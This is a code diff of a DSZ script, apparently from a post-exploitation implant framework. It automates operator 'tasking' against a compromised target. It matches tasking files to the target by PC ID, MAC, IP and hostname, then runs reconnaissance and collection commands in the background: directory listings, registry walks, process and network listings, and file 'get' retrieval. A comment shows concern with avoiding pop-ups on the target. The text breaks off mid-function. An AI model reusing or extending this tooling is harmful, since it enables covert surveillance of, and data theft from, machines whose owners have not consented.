@@ -1,0 +1,1249 @@
+# DSZ script processes each txt file found in the TaskedCmds directory by determining the type
+# of tasking (dir, ipconfig, regquery, ...) and then calling the appropriate DSZ script. Each
+# command script is run in the background. When finished, the results are written to a file
+# in the TaskResults directory, located on the OpsDisk in the Logs directory. The main script
+# is terminated when all of the background jobs associated with tasking are completed which
+# is determined by using the pollStatus routine.
+
+@include "_Arrays.dsi";
+@include "_CommandLine.dsi";
+@include "_Xml.dsi";
+
+@include "Include/_dirTasking.dsi";
+@include "Include/_ipTasking.dsi";
+@include "Include/_netmapTasking.dsi";
+@include "Include/_regQueryTasking.dsi";
+@include "Include/_netstatTasking.dsi";
+@include "Include/_routeTasking.dsi";
+@include "Include/_arpTasking.dsi";
+@include "Include/_processlistTasking.dsi";
+@include "Include/_auditTasking.dsi";
+@include "Include/_localeTasking.dsi";
+@include "Include/_tracerouteTasking.dsi";
+@include "Include/_regWalkTasking.dsi";
+@include "Include/_getTasking.dsi";
+@include "Include/_systemInfoTasking.dsi";
+@include "Include/_writeTaskedResults.dsi";
+@include "_File.dsi";
+@include "_LpHelperFunctions.dsi";
+@include "_Menu.dsi";
+
+bool $filesFound = true;
+#string $command = "";
+#string $taskID = "";
+#string $targetID = "";
+#string $priority = "";
+#bool $ok = false;
+#string $location = "";
+
+string %params;
+if (!_ParseCommandLine($argc, $argv, %params)) {
+	return false;
+}
+
+if (defined(%params{"verbose"}) && <bool>%params{"verbose"}) {
+	%_sgEnv{'verbose'} = "true";
+} else {
+	%_sgEnv{'verbose'} = "false";
+}
+
+# Get location of Commands directory to translate command parameters into dsz command
+string $startDir;
+if (defined(%params{"tasking"})) {
+	$startDir = %params{"tasking"};
+} else {
+	$startDir = "%_sgEnv{'script_path'}/../TaskedCmds/";
+}
+
+echo ("--------------------------------", GOOD);
+echo (GetProjectVersion(), GOOD);
+echo ("--------------------------------", GOOD);
+echo ("");
+
+# Put results in the TaskResults directory, created as sibling of Logs directory
+string $temp;
+if (!_GetLpLogsDirectory($temp) || !defined($temp)) {
+	return false;
+}
+
+string $resultsDir = "$temp/TaskResults";
+if (!_FileExistsLocal($resultsDir)){
+	`local mkdir "$resultsDir"`;
+}
+
+
+int $jobs;
+int $cnt = 0;
+
+#Find tasking and prompt user
+string $metaFiles;
+string $metaFilter = "*_metadata.txt";
+bool $taskingFound = false;
+if (!FileGetFiles($startDir, $metaFilter, $metaFiles, true)){
+	echo ("Unable to find tasking\n", ERROR);
+	return false;
+}
+
+string $filesGood;
+string $messageGood;
+string $filesMaybe;
+string $messageMaybe;
+string $filesBad;
+string $messageBad;
+
+for (int $i=0; $i<sizeof($metaFiles); $i++) {
+	string $metaFile = $metaFiles[$i];
+	int $type;
+	string $msg;
+	
+	findTasking($metaFile, false, $type, $msg);
+	if ($type == GOOD) {
+		_AppendString($filesGood,    $metaFile);
+		_AppendString($messageGood, "$msg:  $metaFile");
+	} else if ($type == WARNING) {
+		_AppendString($filesMaybe,   $metaFile);
+		_AppendString($messageMaybe, "$msg:  $metaFile");
+	} else if ($type == ERROR) {
+		_AppendString($filesBad, $metaFile);
+		_AppendString($messageBad, "$msg:  $metaFile");
+	}
+	
+}
+
+while (true) {
+	string $dub;
+	int $selected;
+	for (int $i = 0; $i < 5; $i++) {
+		echo();
+	}
+	
+	string $files;
+	string $message;
+	
+	AddList($files, $message, $filesGood,  $messageGood);
+	AddList($files, $message, $filesMaybe, $messageMaybe);
+	AddList($files, $message, $filesBad,   $messageBad);
+	
+	if (!_ExecuteSimpleMenu("Available Tasking", $message, $dub, $selected)) {
+		break;
+	}
+	if (!defined($selected)) {
+		break;
+	}
+	int $type;
+	string $msg;
+	if (findTasking($files[$selected], true, $type, $msg)) {
+		runTasking($files[$selected], $resultsDir, $jobs, $cnt);
+		remove($files[$selected], $filesGood, $filesMaybe, $filesBad);
+	}
+}
+
+
+# Since scripts are backgrounded, 10 at a time, must check status periodically to determine when done
+if ($cnt > 0) {
+	pollStatus ($jobs, $cnt);
+}
+
+return true;
+
+#--------------------------------------------------------------------------
+sub remove(IN string $file, REF string $good, REF string $maybe, REF string $bad) {
+	remove($file, $good);
+	remove($file, $maybe);
+	remove($file, $bad);
+}
+
+#--------------------------------------------------------------------------
+sub remove(IN string $file, REF string $array) {
+	for (int $i = 0; $i < sizeof($array); $i++) {
+		if (!defined($array[$i])) {
+			continue;
+		}
+		if($array[$i] == $file) {
+			undef($array[$i]);
+		}
+	}
+}
+#--------------------------------------------------------------------------
+sub AddList(REF string $outFiles, REF string $outMessage, IN string $files, IN string $message) {
+	for (int $i = 0; $i < sizeof($files); $i++) {
+		if (defined($files[$i])) {
+			_AppendString($outFiles,   $files[$i]);
+			_AppendString($outMessage, $message[$i]);
+		}
+	}
+}
+
+#--------------------------------------------------------------------------
+# Runs tasking for a given metadata file
+#--------------------------------------------------------------------------
+sub runTasking(IN string $metaFile, IN string $resultsDir, REF int $jobs, REF int $cnt) {
+	string $command = "";
+	string $taskID = "";
+	string $targetID = "";
+	string $priority = "";
+	bool $ok = false;
+	string $location = "";
+	if (<bool>%_sgEnv{"verbose"}) {
+		echo "About to start parsing tasking";
+	}
+	string $parts;
+	SplitPath($metaFile, $parts);
+	string $taskingDir = $parts[0];
+	string $resultsFile;
+	string $mask = "*.txt";
+
+	# Assuming priority level goes from 1 to 9
+	for (int $j=1; $j < 10; $j++) {
+		string $filter = "$j$mask";
+		string $files = "";
+		#string $scriptFile = "";
+
+		if (<bool>%_sgEnv{"verbose"}) {
+			echo "Look for files:";
+			echo "\ttaskingDir = $taskingDir";
+			echo "\tfilter = $filter";
+		}
+		# Run  tasking associated with metadata file
+		if (!FileGetFiles($taskingDir, $filter, $files, true)) {
+			if (<bool>%_sgEnv{"verbose"}) {
+				echo "Failed to get tasking files";
+			}
+		} else {
+			for (int $i=0; $i < sizeof($files); $i++) {
+				if (<bool>%_sgEnv{"verbose"}) {
+					echo "Examining $files[$i] for tasking purposes";
+				}
+				string $timestamp;
+				# necessary to ensure that there are no identical timestamps
+				Sleep(1000);
+				if (!GetTimestamp($timestamp)) {
+					$timestamp = "_Unknown";
+				} else {
+					$timestamp = "_$timestamp";
+				}
+
+				# dir processing
+				if (RegexMatch("_dirTasking", $files[$i])) {
+					_dirTasking($files[$i], $command, $taskID, $targetID);
+					$resultsFile = "$resultsDir/dir_$taskID$timestamp.xml";
+					if (checkDevice($command)) {
+						runCmd ($command, $resultsFile, $taskID, $targetID, $jobs, $cnt);
+					}
+				} 
+
+				# regquery processing
+				if (RegexMatch("_regQueryTasking", $files[$i])) {
+					_regQueryTasking($files[$i], $command, $taskID, $targetID);
+					$resultsFile = "$resultsDir/regquery_$taskID$timestamp.xml";
+					echo ("\nRegistry Query: $command", WARNING);
+					if (prompt("\nRun anyway?", true)) {
+						runCmd ($command, $resultsFile, $taskID, $targetID, $jobs, $cnt);
+					}
+				}
+
+				# ipconfig processing
+				if (RegexMatch("_ipconfigTasking", $files[$i])) {
+					_ipTasking($files[$i], $command, $taskID, $targetID);
+					$resultsFile = "$resultsDir/ipconfig_$taskID$timestamp.xml";
+					runCmd ($command, $resultsFile, $taskID, $targetID, $jobs, $cnt);
+				} 
+				# netmap processing
+				if (RegexMatch("_netmapTasking", $files[$i])) {
+					_netmapTasking($files[$i], $command, $taskID, $targetID);
+					$resultsFile = "$resultsDir/netmapTasking_$taskID$timestamp.xml";
+					runCmd ($command, $resultsFile, $taskID, $targetID, $jobs, $cnt);
+				}
+				# netstat processing
+				if (RegexMatch("_netstatTasking", $files[$i])) {			
+					_netstatTasking($files[$i], $command, $taskID, $targetID);
+					$resultsFile = "$resultsDir/netstatTasking_$taskID$timestamp.xml";
+					runCmd ($command, $resultsFile, $taskID, $targetID, $jobs, $cnt);
+				} 
+				# routetable processing
+				if (RegexMatch("_routeTasking", $files[$i])) {
+					_routeTasking($files[$i], $command, $taskID, $targetID);
+					$resultsFile = "$resultsDir/route_$taskID$timestamp.xml";
+					runCmd ($command, $resultsFile, $taskID, $targetID, $jobs, $cnt);
+				}
+
+				# arp processing
+				if (RegexMatch("_arpTasking", $files[$i])) {
+					_arpTasking($files[$i], $command, $taskID, $targetID);
+					$resultsFile = "$resultsDir/arp_$taskID$timestamp.xml";
+					runCmd ($command, $resultsFile, $taskID, $targetID, $jobs, $cnt);
+				}
+
+				# processlist processing
+				if (RegexMatch("_processlistTasking", $files[$i])) {
+					_processlistTasking($files[$i], $command, $taskID, $targetID);
+					$resultsFile = "$resultsDir/processlist_$taskID$timestamp.xml";
+					runCmd ($command, $resultsFile, $taskID, $targetID, $jobs, $cnt);
+				}
+
+				# audit processing
+				if (RegexMatch("_auditTasking", $files[$i])) {	
+					_auditTasking($files[$i], $command, $taskID, $targetID);
+					$resultsFile = "$resultsDir/audit_$taskID$timestamp.xml";
+					runCmd ($command, $resultsFile, $taskID, $targetID, $jobs, $cnt);
+				}
+
+				# locale processing
+				if (RegexMatch("_localeTasking", $files[$i])) {	
+					_localeTasking($files[$i], $command, $taskID, $targetID);
+					$resultsFile = "$resultsDir/locale_$taskID$timestamp.xml";
+					runCmd ($command, $resultsFile, $taskID, $targetID, $jobs, $cnt);
+				}
+
+				# traceroute processing (Assume dmgz is already installed)
+				if (RegexMatch("_tracerouteTasking", $files[$i])) {	
+					_tracerouteTasking($files[$i], $command, $taskID, $targetID);
+					$resultsFile = "$resultsDir/traceroute_$taskID$timestamp.xml";
+					runCmd ($command, $resultsFile, $taskID, $targetID, $jobs, $cnt);
+				}
+
+				# regwalk processing
+				if (RegexMatch("_regwalkTasking", $files[$i])) {	
+					_regWalkTasking($files[$i], $command, $taskID, $targetID);
+					$resultsFile = "$resultsDir/regwalk_$taskID$timestamp.xml";
+					echo ("\nRegistry Walk: $command", WARNING);
+					if (prompt("\nRun anyway?", true)) {
+						runCmd ($command, $resultsFile, $taskID, $targetID, $jobs, $cnt);
+					}
+				}
+
+				# get processing
+				if (RegexMatch("_getTasking", $files[$i])) {
+					_getTasking($files[$i], $command, $taskID, $targetID);
+					$resultsFile = "$resultsDir/get_$taskID$timestamp.xml";
+					
+					# Check size before retrieving
+					if (checkSize($command)) {
+						if (checkDevice($command)) {
+							runCmd ($command, $resultsFile, $taskID, $targetID, $jobs, $cnt);
+						}
+					}
+				} 
+
+				# systeminfo processing
+				if (RegexMatch("_systeminfoTasking", $files[$i])) {	
+					_systeminfoTasking($files[$i], $command, $taskID, $targetID);
+					$resultsFile = "$resultsDir/systeminfo_$taskID$timestamp.xml";
+					runCmd ($command, $resultsFile, $taskID, $targetID, $jobs, $cnt);
+				} 
+			}
+		}
+	}
+}
+
+#--------------------------------------------------------------------------
+# RunCmd
+#		Runs a command, but only if there are no more than the max (10).
+#		If the number of DSZ commands is > 10, call pollJobs to determine 
+#		when another job can be added
+#--------------------------------------------------------------------------
+Sub runCmd(IN STRING $command, IN STRING $resultsFile, IN STRING $taskID, IN STRING $targetID, REF INT $jobs, REF INT $cnt) {
+	if ($command != "") {
+	
+		if (<bool>%_sgEnv{"verbose"}) {
+			echo "Run Command:  '$command'";
+		}
+	
+		bool $suc;
+		int $idValue;
+		int $id;
+		int $cmdid;
+		string $location;
+		string $fileLoc;
+
+		for (int $j=0; $j < sizeof($command); $j++)
+		{
+			if ($cnt > 9)
+			{
+				echo ("\nThere are currently $cnt tasks running...waiting for one or more to finish\n", WARNING);
+				while ($cnt > 9)
+				{
+					pollJobs($jobs, $cnt);
+				}
+			}
+			@record on;
+			bool $ok = `background $command[$j]`;
+			@record off;
+
+			if (!GetCmdData("commandmetadata::id", $cmdid)) {
+   				return false;
+			}
+			if (!GetCmdData("commandmetadata::xmllog", $location)) {
+   				$fileLoc[$j] = "Does not exist";
+			}
+			else {
+   				$fileLoc[$j] = $location;
+			}
+			$jobs[$cnt] = $cmdid;
+			$cnt++;
+		} 
+		# Write results to TaskResults directory
+		writeResults($resultsFile, $taskID, $targetID, $command, $fileLoc);
+	}	
+}
+
+#--------------------------------------------------------------------------
+# findTasking
+#		Attempt to match up target with tasking by first checking PC ID and
+#		then checking MACs
+#--------------------------------------------------------------------------
+Sub findTasking(IN STRING $metaFile, IN bool $bQuery, OUT int $suggestionType, OUT string $suggestion)
+{
+
+	echo "Metadata:  $metaFile";
+
+	# first, get target information
+	int		$host_pcIds;
+	string	$host_macAddresses;
+	string	$host_ipaddresses;
+	string	$host_hostname = "(None)";
+	string	$host_domain = "(None)";
+	
+	if (!FindTargetInformation($host_pcIds, $host_macAddresses, $host_ipAddresses, $host_hostname, $host_domain)) {
+		echo "Unable to find local information for comparison.";
+		return false;
+	}
+
+	# second, get metadata information
+	int		$meta_pcIds;
+	string	$meta_macAddresses;
+	string	$meta_ipaddresses;
+	string	$meta_hostname = "(None)";
+	string	$meta_domain = "(None)";
+
+	if (!FindMetadataInformation($metaFile, $meta_pcIds, $meta_macAddresses, $meta_ipaddresses, $meta_hostname, $meta_domain)) {
+		echo ("Unable to find metadata for comparison.", ERROR);
+		return false;
+	}
+
+	# PC ID comparison
+	if (sizeof($host_pcIds) > 0 && sizeof($meta_pcIds) > 0) {
+		# do comparison
+		int $matches;
+		bool $matchFound = false;
+		for (int $i = 0; $i < sizeof($host_pcIds); $i++) {
+			for (int $j = 0; $j < sizeof($meta_pcIds); $j++) {
+				if ($host_pcIds[$i] == $meta_pcIds[$j]) {
+					$matchFound = true;
+				}
+			}
+		}
+		int $fieldSize = 18;
+		string $banner = "";
+		StrCat($banner, CenterString("Target", $fieldSize));
+		StrCat($banner, "   ");
+		StrCat($banner, CenterString("Metadata", $fieldSize));
+				
+		string $line = "";
+		StrCat($line, CenterString("PC IDs", strlen($banner)));
+		echo $line;
+		echo $banner;
+		echo Repeat("-", strlen($banner));
+		int $count = max(sizeof($host_pcIds), sizeof($meta_pcIds));
+		for (int $i = 0; $i < $count; $i++) {
+			string $host = PadRightString("", $fieldSize);
+			if ($i < sizeof($host_pcIds)) {
+				$host = NumberToHexString($host_pcIds[$i], 16);
+			}
+			string $meta = PadRightString("", $fieldSize);
+			if ($i < sizeof($meta_pcIds)) {
+				$meta = NumberToHexString($meta_pcIds[$i], 16);
+			}
+			
+			echo "$host   $meta";
+			
+		}
+
+		int $type;
+		string $message;
+		if (!$matchFound) {
+			if (sizeof($host_pcIds) > 0 && sizeof($meta_pcIds) > 0) {
+				$type = ERROR;
+				$message = "No match!";
+				
+				SetSuggestion($suggestion, $suggestionType, "SKIP", ERROR);
+			} else {
+				$type = WARNING;
+				$message = "No values to match";
+			}
+		} else {
+			if (sizeof($host_pcIds) > 1 || sizeof($meta_pcIds) > 1) {
+				$type = WARNING;
+				$message = "Weak Match - Multiple Ids";
+				
+				SetSuggestion($suggestion, $suggestionType, "CONSIDER", WARNING);
+			} else {
+				$type = GOOD;
+				$message = "Solid Match";
+				
+				SetSuggestion($suggestion, $suggestionType, "DO TASKING", GOOD);
+			}
+		}
+		echo("PC ID Comparison:  $message", $type);
+		
+	} else if (sizeof($host_pcIds) > 0) {
+		echo ("Metadata did not contain a PC ID", WARNING);
+	} else if (sizeof($meta_pcIds) > 0) {
+		echo ("Unable to determine ID of current PC connection", WARNING);
+	} else {
+		echo ("Unable to find any PC ID", WARNING);
+	}
+	echo();
+
+	# MAC comparison
+	if (sizeof($host_macAddresses) > 0 && sizeof($meta_macAddresses) > 0) {
+		# do comparison
+		bool $matchFound = false;
+		for (int $i = 0; $i < sizeof($host_macAddresses); $i++) {
+			for (int $j = 0; $j < sizeof($meta_macAddresses); $j++) {
+				if ($host_macAddresses[$i] == $meta_macAddresses[$j]) {
+					$matchFound = true;
+				}
+			}
+		}
+		int $fieldSize = 16;
+		string $banner = "";
+		StrCat($banner, CenterString("Target", $fieldSize));
+		StrCat($banner, "   ");
+		StrCat($banner, CenterString("Metadata", $fieldSize));
+		
+		
+		string $line = "";
+		StrCat($line, CenterString("MACs", strlen($banner)));
+		echo $line;
+		echo $banner;
+		echo Repeat("-", strlen($banner));
+		int $count = max(sizeof($host_macAddresses), sizeof($meta_macAddresses));
+		for (int $i = 0; $i < $count; $i++) {
+			string $host = PadRightString("", $fieldSize);
+			if ($i < sizeof($host_macAddresses)) {
+				$host = PadRightString($host_macAddresses[$i], $fieldSize);
+			}
+			string $meta = PadRightString("", $fieldSize);
+			if ($i < sizeof($meta_macAddresses)) {
+				$meta = PadRightString($meta_macAddresses[$i], $fieldSize);
+			}
+			
+			echo "$host   $meta";
+			
+		}
+		
+		int $type;
+		string $message;
+		
+		if ($matchFound) {
+			echo("Matching MAC found", GOOD);
+			SetSuggestion($suggestion, $suggestionType, "DO TASKING", GOOD);
+		} else {
+			echo("No Matching MAC found", WARNING);
+			
+			# only override if IDs failed
+			if (!(defined($suggestionType) && $suggestionType == GOOD)) {
+				SetSuggestion($suggestion, $suggestionType, "SKIP", ERROR);
+			}
+		}
+	} else {
+		echo("Insufficient MACs for a comparison", WARNING);
+	}
+	echo();
+	
+	# IP comparison
+	if (sizeof($host_ipAddresses) > 0 && sizeof($meta_ipAddresses) > 0) {
+		# do comparison
+		bool $matchFound = false;
+		for (int $i = 0; $i < sizeof($host_ipAddresses); $i++) {
+			for (int $j = 0; $j < sizeof($meta_ipAddresses); $j++) {
+				if ($host_ipAddresses[$i] == $meta_ipAddresses[$j]) {
+					$matchFound = true;
+				}
+			}
+		}
+		
+		int $fieldSize = 15;
+		string $banner = "";
+		StrCat($banner, CenterString("Target", $fieldSize));
+		StrCat($banner, "   ");
+		StrCat($banner, CenterString("Metadata", $fieldSize));
+		
+		string $line = "";
+		StrCat($line, CenterString("IPs", strlen($banner)));
+		echo $line;
+		
+		echo $banner;
+		echo Repeat("-", strlen($banner));
+		int $count = max(sizeof($host_ipAddresses), sizeof($meta_ipAddresses));
+		for (int $i = 0; $i < $count; $i++) {
+			string $host = PadRightString("", $fieldSize);
+			if ($i < sizeof($host_ipAddresses)) {
+				$host = PadRightString($host_ipAddresses[$i], $fieldSize);
+			}
+			string $meta = PadRightString("", $fieldSize);
+			if ($i < sizeof($meta_ipAddresses)) {
+				$meta = PadRightString($meta_ipAddresses[$i], $fieldSize);
+			}
+			
+			echo "$host   $meta";
+			
+		}
+		
+		int $type;
+		string $message;
+		
+		if ($matchFound) {
+			echo("Matching IP found", GOOD);
+			if (!defined($suggestionType) || $suggestionType == ERROR) {
+				SetSuggestion($suggestion, $suggestionType, "CONSIDER TASKING", WARNING);
+			}
+		} else {
+			echo("No Matching IP found", WARNING);
+			
+			# only override if IDs failed
+			if (!(defined($suggestionType) && $suggestionType == GOOD)) {
+				SetSuggestion($suggestion, $suggestionType, "SKIP", WARNING);
+			}
+		}
+	} else {
+		echo("Insufficient MACs for a comparison", WARNING);
+	}
+	echo();
+	
+	# for variable & logical scoping
+	if (true) {
+		int $fieldSize = Max(Max(8, Max(strlen($host_hostname), strlen($meta_hostname))),
+						Max(6, Max(strlen($host_domain), strlen($meta_domain))));
+		
+		string $banner = "";
+		StrCat($banner, PadRightString("Field", 9));
+		StrCat($banner, "  ");
+		StrCat($banner, CenterString("Target", $fieldSize));
+		StrCat($banner, "  ");
+		StrCat($banner, CenterString("Metadata", $fieldSize));
+		
+		
+		string $line = "";
+		int $type = DEFAULT;
+		StrCat($line, CenterString("Computer Name", strlen($banner)));
+		echo $line;
+		
+		echo $banner;
+		echo Repeat("-", strlen($line));
+		
+		$line = "";
+		$type = DEFAULT;
+		StrCat($line, PadRightString("Hostname:", 9));
+		StrCat($line, "  ");
+		StrCat($line, CenterString($host_hostname, $fieldSize));
+		StrCat($line, "  ");
+		StrCat($line, CenterString($meta_hostname, $fieldSize));
+		if ($host_hostName == $meta_hostname) {
+			$type = GOOD;
+		} else {
+			$type = ERROR;
+		}
+		echo($line, $type);
+
+		$line = "";
+		$type = DEFAULT;
+		StrCat($line, PadRightString("Domain:", 9));
+		StrCat($line, "  ");
+		StrCat($line, CenterString($host_domain, $fieldSize));
+		StrCat($line, "  ");
+		StrCat($line, CenterString($meta_domain, $fieldSize));
+		if ($host_domain == $meta_domain) {
+			$type = GOOD;
+		} else {
+			$type = ERROR;
+		}
+		echo($line, $type);
+		
+		if ($host_hostname == $meta_hostname && $host_domain == $meta_domain) {
+			if (!defined($suggestionType)) {
+				SetSuggestion($suggestion, $suggestionType, "SKIP", WARNING);
+			}
+		} else {
+			echo("Computer name does not match", WARNING);
+			# only override if IDs failed
+			if (!defined($suggestionType)) {
+				SetSuggestion($suggestion, $suggestionType, "SKIP", ERROR);
+			}
+		}
+		echo();
+	}
+
+	if (!defined($suggestionType)) {
+		SetSuggestion($suggestion, $suggestionType, "SKIP", ERROR);
+	}
+	
+	string $parts;
+	string $tokens;
+	SplitPath($metaFile, $parts);
+	RegExSplit("_", $parts[1], 0, $tokens);
+	string $target = $tokens[0];
+	if ($bQuery) {
+		echo "Please review tasking pattern matching.";
+		if ($suggestionType == GOOD) {
+			echo("You have tasking for [$target]", GOOD);
+		} else if ($suggestionType == WARNING) {
+			echo("You may have tasking for [$target], but manual review is necessary.", WARNING);
+		} else {
+			echo("You do not have tasking for [$target]", WARNING);
+		}
+		echo ("Automated tasking script recommends:  $suggestion", $suggestionType);
+		if ($suggestionType == GOOD) {
+			return prompt("Do you want to run tasking?");
+		}
+		return prompt("Do you want to run tasking?", false);
+	} else {
+		return $suggestionType == GOOD;
+	}
+}
+
+#--------------------------------------------------------------------------
+sub SetSuggestion(REF string $currentSuggestion, 
+				  REF int $currentSuggestionType,
+				  IN  string $newSuggestion,
+				  IN  int $newSuggestionType)
+{
+	if (!defined($currentSuggestion)) {
+		$currentSuggestion = $newSuggestion;
+		$currentSuggestionType = $newSuggestionType;
+	}
+	else if ($currentSuggestionType == GOOD && $newSuggestionType != GOOD) {
+		$currentSuggestion = $newSuggestion;
+		$currentSuggestionType = $newSuggestionType;
+	}
+	else if ($currentSuggestionType == WARNING && $newSuggestionType != ERROR) {
+		$currentSuggestion = $newSuggestion;
+		$currentSuggestionType = $newSuggestionType;
+	}
+}
+
+#--------------------------------------------------------------------------
+# ComparePossibleIds
+#		Handles comparing the metadata's id and the pc id.
+#		Since there might be multiple formats, this function tries them
+#--------------------------------------------------------------------------
+sub ComparePossibleIds(IN STRING $metaId, IN STRING $pcId)
+{
+	if (!defined($metaId) || !defined($pcId)) {
+		return false;
+	}
+	
+	# one or both could be straight integers
+	# or hex values with or without 0x in front.
+	if (<bool>%_sgEnv{"verbose"}) {
+		echo "Comparing:  $metaId =?= $pcId";
+	}
+	
+	string $id1, $id2;
+	
+	_AppendString($id1, "$metaId");
+	_AppendString($id2, "$pcId");
+
+	_AppendString($id1, "0x$metaId");
+	_AppendString($id2, "$pcId");
+	
+	_AppendString($id1, "$metaId");
+	_AppendString($id2, "0x$pcId");
+	
+	for (int $i = 0; $i < sizeof($id1); $i++) {
+		if (CompareId(<int>$id1[$i], <int>$id2[$i])) {
+			return true;
+		}
+	}
+	
+	return false;
+	
+}
+
+#--------------------------------------------------------------------------
+# CompareId
+#--------------------------------------------------------------------------
+sub CompareId(IN int $id1, IN int $id2)
+{
+	if (<bool>%_sgEnv{"verbose"}) {
+		echo "   Comparing $id1 =?= $id2";
+	}
+	if ($id1 == 0 || $id2 == 0) {
+		if (<bool>%_sgEnv{"verbose"}) {
+			echo "   At least one value is zero - automatic failure";
+		}
+		return false;
+	}
+	
+	return $id1 == $id2;
+}
+
+#--------------------------------------------------------------------------
+# Check to see if MAC address is valid. (This should be beefed up as we figure out what valid means.)
+#--------------------------------------------------------------------------
+Sub validateMAC (IN STRING $mac) {
+	if (<bool>%_sgEnv{"verbose"}) {
+		echo "Is MAC '$mac' valid?";
+	}
+	if ($mac == "0") {
+		return false;
+	}
+	
+	return true;
+}
+
+#--------------------------------------------------------------------------
+# Check file size (using dir) before pulling back get files
+#--------------------------------------------------------------------------
+Sub checkSize (IN STRING $command) {
+	int $size;
+	string $parameters;
+	RegExSplit(" ", $command, 0, $parameters);
+	string $dirCmd = "dir ";
+	for (int $i=0; $i<sizeof($parameters); $i++) {
+		if ($i==1) {
+			string $firstCh;
+			 _SubString($parameters[$i], 0, 1, $firstCh);
+			if (!($firstCh == "-")) {
+				$dirCmd = "$dirCmd $parameters[$i]";
+			}
+		} 
+		if (RegexMatch("-mask", $parameters[$i])) {
+			$i++;
+			string $mask = $parameters[$i];
+			$dirCmd = "$dirCmd -mask $mask";
+		}
+		if (RegexMatch("-path", $parameters[$i])) {
+			$i++;
+			string $path = $parameters[$i];
+			$dirCmd = "$dirCmd -path $path";
+		}
+		if (RegexMatch("-after", $parameters[$i])) {
+			$i++;
+			string $after = $parameters[$i];
+			$dirCmd = "$dirCmd -after $after";
+		}
+		if (RegexMatch("-before", $parameters[$i])) {
+			$i++;
+			string $before = $parameters[$i];
+			$dirCmd = "$dirCmd -before $before";
+		}
+		if (RegexMatch("-age", $parameters[$i])) {
+			$i++;
+			string $age = $parameters[$i];
+			$dirCmd = "$dirCmd -age $age";
+		}
+		if (RegexMatch("-time", $parameters[$i])) {
+			$i++;
+			string $time = $parameters[$i];
+			$dirCmd = "$dirCmd -time $time";
+		}
+		if (RegexMatch("-recursive", $parameters[$i])) {
+			string $recursive = $parameters[$i];
+			$dirCmd = "$dirCmd -recursive";
+		}
+		if (RegexMatch("-max", $parameters[$i])) {
+			$i++;
+			string $max = $parameters[$i];
+			$dirCmd = "$dirCmd -max $max";
+		}
+	}
+	# run dir command to determine size of get files
+        @echo off;
+	@record on;
+	`$dirCmd`;
+	@record off;
+
+	Object $dirlist;
+	Object $filelist;
+	int $totalsize = 0;
+
+	if (!GetCmdData("diritem", $dirlist) || (sizeof($dirlist) != 1)) {
+		$totalsize = 0;
+	}
+	else {
+		if (!GetObjectData($dirlist[0], "fileitem", $filelist)) {
+			return false;
+		}
+		else {
+			for (int $j=0; $j<sizeof($filelist); $j++) {
+				if (GetObjectData($filelist[$j], "size", $size)) {
+					$totalsize += $size;
+				}
+			}
+		}
+	}
+	if ($totalsize > 2000000) {
+		echo ("\nThe get that you requested is over 2 Meg [$totalsize].", WARNING);
+		if (!prompt("\nRetrieve anyway?", true)) {
+			return false;
+		}
+	}
+	return true;
+}
+
+#--------------------------------------------------------------------------
+# Check to see if Fixed device for dir and get commands 
+# If not, ask user if they still want to run it. (Otherwise, could get pop-up on target if not running as System)
+#--------------------------------------------------------------------------
+Sub checkDevice(IN STRING $command) {
+	# looking for a drive
+	bool $ok;
+	string $drivetype;
+	string $parts;
+	string $drive = "";
+	string $colon = ":";
+	string $backslash = "\\";
+	string $drivelist;
+	if (RegexMatch(":", $command)) 
+	{
+		# drive found
+		echo $command;
+		RegExSplit(":", $command, 0, $parts);
+		int $start = StrLen($parts[0]);
+		$start--;
+		_Substring($parts[0], $start, $drive);
+		$drive = "$drive$colon$backslash";
+		@echo off;
+		@record on;
+		$ok = `drives`;
+		@record off;
+		@echo on;
+		if (!GetCmdData("driveitem::type", $drivetype) || !defined($drivetype) ||
+		    !GetCmdData("driveitem::drive", $drivelist)|| !defined($drivelist)) 
+		{
+			echo "Failed";
+		}
+		for (int $i=0; $i<sizeof($drivetype); $i++) 
+		{
+			if ($drivelist[$i] == $drive)
+			{
+				if ($drivetype[$i] == "Fixed")
+				{
+					return true;
+				}
+				else 
+				{
+					echo ("\n$command contains a Non-Fixed Drive: $drive.", WARNING);
+					if (!prompt("\nRun anyway?", true)) {
+						return false;
+					}
+				}
+			}
+		}
+	}
+	return true;
+}
+
+#--------------------------------------------------------------------------
+# Parent for getting local information
+#--------------------------------------------------------------------------
+sub FindTargetInformation(OUT int $pcIds, 
+						  OUT string $macAddresses, 
+						  OUT string $ipAddresses, 
+						  REF string $hostname, 
+						  REF string $domain) {
+	bool $pcs = FindPcId($pcIds);
+	bool $macs = FindHostInformation($macAddresses, $ipAddresses, $hostname, $domain);
+	
+	return $pcs || $macs;
+}
+
+#--------------------------------------------------------------------------
+# Get the PC id from PCInfo.xml
+#--------------------------------------------------------------------------
+sub FindPcId(OUT int $pcIds) {
+	@record on;
+	@echo off;
+	string $logsDir;
+	if (!_GetLpLogsDirectory($logsDir) || !defined($logsDir)) {
+		return false;
+	}
+	string $filter = "PCInfo*.xml";
+	string $pcFile;
+	if (FileGetFiles($logsDir, $filter, $pcFile, true)) {
+		if (sizeof($pcFile)) > 0 {
+			for (int $i=0; $i < sizeof($pcFile); $i++) {
+				_XmlElement @elements;
+				if (_XmlReadFile($pcFile[$i], "Id", @elements)) {
+					for (int $j = 0; $j < sizeof(@elements.$text); $j++) {
+						AppendInteger($pcIds, <int>@elements.$text[$j]);
+					}
+				}
+			}
+		}
+	}
+	return sizeof($pcIds) > 0;
+}
+
+#--------------------------------------------------------------------------
+# Get host information
+#--------------------------------------------------------------------------
+sub FindHostInformation(OUT string $macAddresses, 
+						OUT string $ipAddresses, 
+						REF string $hostname, 
+						REF string $domain) {
+	@record on;
+	@echo off;
+	string $logsDir;
+	if (!_GetLpLogsDirectory($logsDir) || !defined($logsDir)) {
+		return false;
+	}
+	string $filter = "hostinfo_*.xml";
+	string $hostInfo;
+	if (FileGetFiles($logsDir, $filter, $hostInfo, true)) {
+		if (sizeof($hostInfo)) > 0 {
+			for (int $i=0; $i < sizeof($hostInfo); $i++) {
+				if (`xmlparser -file $hostInfo[$i]`) {
+					FindHostInformation_HostInformation($macAddresses, $ipaddresses, $hostname, $domain);
+				}
+			}
+		}
+	}
+	return true;
+}
+
+#--------------------------------------------------------------------------
+sub FindHostInformation_HostInformation(REF string $macAddresses, 
+										REF string $ipAddresses, 
+										REF string $hostname, 
+										REF string $domain) {
+	object $element;
+	if (GetCmdData("element", $element) && defined($element)) {
+		for (int $i = 0; $i < sizeof($element); $i++) {
+			string $name;
+			if (GetObjectData($element[$i], "name", $name) && defined($name) && $name == "HostInformation") {
